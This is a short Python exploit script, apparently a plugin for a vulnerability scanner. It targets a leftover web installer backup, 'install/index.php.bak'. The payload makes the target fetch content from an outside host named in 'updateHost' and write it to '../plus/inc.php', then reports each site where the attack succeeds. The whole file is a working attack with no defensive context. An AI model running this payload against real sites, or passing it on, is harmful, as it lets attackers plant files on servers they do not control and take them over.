#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../plus/inc.php&updateHost=www.zzgjxx.org"
bug ="存在(您可以选择安装进行体验)"
info = "/plus/inc.php"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
